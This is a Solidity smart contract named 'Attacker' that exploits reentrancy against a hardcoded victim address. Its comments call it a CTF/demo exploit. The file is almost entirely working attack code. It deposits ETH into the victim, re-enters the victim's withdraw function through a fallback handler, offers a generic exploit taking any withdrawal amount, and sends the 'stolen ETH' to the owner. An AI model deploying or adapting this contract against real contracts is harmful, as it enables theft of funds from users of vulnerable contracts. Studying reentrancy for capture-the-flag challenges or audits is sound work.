// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

contract Attacker {

    // -------------------------------------------------------------
    // Custom errors (cheaper than revert strings)
    // -------------------------------------------------------------
    error Failed();
    error DepositFailed();
    error NotEnoughEther();
    error NotOwner();
    error WithdrawFailed();

    address public victim;
    address private owner;
    uint256 public attackCount;

    // -------------------------------------------------------------
    // Setup
    // The victim address is hardcoded for CTF/demo purposes.
    // Using the constructor prevents accidental redeployment on
    // the wrong target and lets us handle ownership cleanly.
    // -------------------------------------------------------------
    constructor() {
        owner = msg.sender;
        victim = 0x413744D59d31AFDC2889aeE602636177805Bd7b0;
    }

    // -------------------------------------------------------------
    // Reentrancy entrypoint
    //
    // Using fallback() lets us catch both:
    //  - ETH transfers with non-empty msg.data
    //  - ETH transfers with empty msg.data *if receive() is absent*
    //
    // This makes fallback() the preferred choice for CTF-style
    // exploitation, because we want maximum control over the
    // callback behavior during reentrancy.
    //
    // attackCount limits recursion depth to avoid infinite loops
    // and ensures only the first callback performs reentry.
    // -------------------------------------------------------------
    fallback() external payable {
        attackCount++;

        if (attackCount < 2 && victim.balance >= 0.1 ether) {
            (bool success, ) = victim.call(
                abi.encodeWithSelector(0x2e1a7d4d, 0.1 ether)
            );
            if (!success) revert Failed();
        }
    }

    // -------------------------------------------------------------
    // Deposit ETH into the victim on behalf of this attacker.
    // This prepares internal balances for the exploit.
    // -------------------------------------------------------------
    function depositToVictim() external payable {
        if (msg.value < 0.1 ether) revert NotEnoughEther();

        (bool success, ) = victim.call{value: msg.value}(
            abi.encodeWithSelector(0x22c33cb3, address(this))
        );

        if (!success) revert DepositFailed();
    }

    // -------------------------------------------------------------
    // Same as depositToVictim but allows specifying any beneficiary.
    // Useful for testing different internal accounting paths.
    // -------------------------------------------------------------
    function depositForMyAddress(address myAddress) external payable {
        if (msg.value < 0.1 ether) revert NotEnoughEther();

        (bool success, ) = victim.call{value: msg.value}(
            abi.encodeWithSelector(0x22c33cb3, myAddress)
        );

        if (!success) revert DepositFailed();
    }

    // -------------------------------------------------------------
    // Triggers a reentrancy using a fixed withdrawal amount.
    // Resets the recursion counter before starting.
    // -------------------------------------------------------------
    function exploitMyBalance() external {
        if (msg.sender != owner) revert NotOwner();

        attackCount = 0;

        (bool success, ) = victim.call(
            abi.encodeWithSelector(0x2e1a7d4d, 0.1 ether)
        );
        if (!success) revert WithdrawFailed();
    }

    // -------------------------------------------------------------
    // Generic exploit with arbitrary withdrawal amount.
    // -------------------------------------------------------------
    function exploit(uint256 amount) external {
        if (msg.sender != owner) revert NotOwner();

        attackCount = 0;

        (bool success, ) = victim.call(
            abi.encodeWithSelector(0x2e1a7d4d, amount)
        );
        if (!success) revert WithdrawFailed();
    }

    // -------------------------------------------------------------
    // Withdraw all stolen ETH to the attacker’s EOA.
    // Only callable by the contract owner.
    // -------------------------------------------------------------
    function withdraw() external {
        if (msg.sender != owner) revert NotOwner();
        payable(owner).transfer(address(this).balance);
    }

    // -------------------------------------------------------------
    // Helper: returns this contract's ETH balance.
    // -------------------------------------------------------------
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // -------------------------------------------------------------
    // Note:
    // We replace `require` with explicit `if` checks + custom errors
    // for better gas efficiency and cleaner revert paths.
    // -------------------------------------------------------------
}
